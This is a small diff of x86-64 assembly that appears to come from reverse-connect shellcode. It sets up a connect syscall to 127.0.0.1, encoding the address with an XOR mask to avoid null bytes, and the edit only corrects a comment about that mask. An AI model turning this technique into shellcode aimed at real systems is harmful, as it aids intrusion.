@@ -26,7 +26,7 @@ xchg rax,rdi
 mov al,0x2a
 ; sockfd in rdi already
 ; struct addr
-; sin_addr=inet_aton('127.0.0.1'), XORed with 0xffffffff00000000
+; sin_addr=inet_aton('127.0.0.1'), XORed with 0xffffffff
 mov rcx,0xfeffff80
 mov r8,0xffffffff
 xor rcx,r8
